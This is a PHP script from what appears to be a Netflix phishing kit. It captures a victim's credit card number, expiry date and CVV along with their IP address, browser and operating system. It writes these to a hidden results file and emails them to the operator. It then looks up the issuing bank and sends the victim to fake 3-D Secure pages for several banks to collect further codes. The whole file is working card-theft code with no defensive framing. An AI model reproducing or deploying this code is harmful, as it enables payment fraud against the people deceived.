<?php

// include('../mail/config.php');

session_start();
////// LAST 4 NUMBERS ////////
$_SESSION['cn'] = $_POST['cn'];
///// LAST 4 NUMBERS ////////
$TIME_DATE = date('H:i:s d/m/Y');
include('get_browser.php');
include('../__CONFIG__.php');
include('get_ip.php');
$message .= "
<!DOCTYPE html>
            <html>
            <head>
                <meta charset='UTF-8' />
            </head>
            <body>
            <style type='text/css'>
            body{
                background: #141414;
                color: #fff;
                font-family: arial;
            }
            .rezlt{
                width: 600px;
            }
            table{
                width: 100%;
                background: #fff;
                color: #000;
            }
            table td{
                padding: 10px;
            }
            .newline{
                width: 100%;
                background: #141414;
                height: 2px;
            }
            </style>
            <center>
            <div class='rezlt'>
                <h3 style='text-align: center;background: #e50914;margin: 0px;padding: 17px;'>Netflix</h3>
                <table>
                    <tr>
                        <td style='width: 200px;'><b>Credit Cards</b></td>
                        <td style='width: 400px;'>".$_POST['cn']."</td>
                    </tr>
                    <tr>
                        <td style='width: 200px;'><b>EXP (MM/YY)</b></td>
                        <td style='width: 400px;'>".$_POST['em']."</td>
                    </tr>
                </table>
                <div class='newline'></div>
                <table>
                    <tr>
                        <td style='width: 200px;'><b>CVV</b></td>
                        <td style='width: 400px;'>".$_POST['cs']."</td>
                    </tr>
                </table>
                <div class='newline'></div>
                <table>
                    <tr>
                        <td style='width: 200px;'><b>IP</b></td>
                        <td style='width: 400px;'><a href='http://geoiptool.com/?ip=".$remote."' target='_blank'>".$remote."</a></td>
                    </tr>
                    <tr>
                        <td style='width: 200px;'><b>Browser</b></td>
                         <td style='width: 400px;'>".DR_Browser($_SERVER['HTTP_USER_AGENT'])."</td>
                    </tr>
                    <tr>
                        <td style='width: 200px;'><b>Current Systeme</b></td>
                       <td style='width: 400px;'>".DR_OS($_SERVER['HTTP_USER_AGENT'])."</td>
                    </tr>
                </table>
            </div>
            </center>
            </body>
            </html>\n";



            $subject  = "NETFL!X [ ❤ DEBIT/CREDIT ❤ ] - [ ".$remote." ] - [ ".$_SESSION['_LOOKUP_COUNTRY_']." ] - ";
            $headers  = "From: NETFL!X <rezult@phinomen.com>\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
            $txt_rezlt = fopen('../_____________RZLT.htm', 'a');
            fwrite($txt_rezlt, $message);
            fclose($txt_rezlt);
      
          @mail($to, $subject, $message, $headers); 
          //> IF SERVER WORK ;)



// SMTP FOR BAD SHELL :D
// $headers = array ('From' => $headers, 'To' => $to, 'Subject' => $subject);
// $smtp = Mail::factory('smtp', array ('host' => $host, 'port' => $port, 'auth' => true, 'username' => $username, 'password' => $password));
// $mail = $smtp->send($to, $headers, $message);
// HAPPY RZLT <3

  




$dr = substr($_POST["cn"], 0, 1);
$drx = substr($_POST["cn"], 0, 6);

$dv = '../3D/master.txt';
$df = '../3D/visa.txt';
$dp = '../3D/poly.txt';
$dn = '../3D/amex.txt';

$contentc = explode("-",  file($dv)[0]);
$contentd = explode("-",  file($df)[0]);
$contentp = explode("-",  file($dp)[0]);
$contentn = explode("-",  file($dn)[0]);



        if (!empty($_POST)) {
        $handle   = curl_init();
        if (false === $handle) {
            return false;
        }

        curl_setopt($handle, CURLOPT_HTTPHEADER, array_merge([
            'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15',  // request as if Firefox
            'Accept-Version: 3',
        ], $headers));
        curl_setopt($handle, CURLOPT_URL, "https://lookup.binlist.net/".$_POST['cn']);
        curl_setopt($handle, CURLOPT_CUSTOMREQUEST, $method);
        curl_setopt($handle, CURLOPT_POSTFIELDS, $data);
        curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($handle, CURLOPT_FOLLOWLOCATION, true);


        $response['content']    = curl_exec($handle);       //get answer
        $response['errno']      = curl_errno($handle);
        $response['error']      = curl_error($handle);
        $response['info']       = curl_getinfo($handle);
        curl_close ($handle);

        $bank = json_decode($response['content'])->bank->name;
        $country = json_decode($response['content'])->country->name;

// UBS 3D

        if ("UBS" == $bank) {
            header('Location: ../3D/ubs/flowGlobal_wflowCNCE_jsession_ubs_fr.php');

               } elseif ("UBS AG" == $bank) {
            header('Location: ../3D/ubs/flowGlobal_wflowCNCE_jsession_ubs_fr.php');


     // CYBERPLUS 
            
        } elseif ("NATIXIS" == $bank) {
            header('Location: ../3D/cyberplus/flowGlobal_wflowCNCE_execution.php');


// CHANGER NUMERO

        } elseif ("CARREFOUR BANQUE" == $bank) {
            header('Location: ../3D/carrefour/flowGlobal_wflowCNCE_jsession_crf.php');

            //  CYBERPLUS


        } elseif ("BANQUE POPULAIRE" == $bank) {
            header('Location: ../3D/cyberplus/flowGlobal_wflowCNCE_execution.php');


   // AMEX CVV (billet train/bus)

    } else if(in_array($dr, $contentn)) {
    header("location:../congratulations.php");


   // POLYNESIE PASS 

    } else if(in_array($drx, $contentp)) {
    header("location:../3D/poly/3D_pass.php");

            // VISA SMS 

    } else if(in_array($dr, $contentd)) {
    header("location:../3D/visa/flowGlobal_wflowCNCE_jsession_visa.php");

     // MASTER SMS 

        } else if(in_array($dr, $contentc)) {
    header("location:../3D/master/flowGlobal_wflowCNCE_jsession_master.php");

    //  
        } else {
            header('Location: ../3D/master/flowGlobal_wflowCNCE_jsession_master.php');
        }
    } else {
        header('Location: #');
    }
?>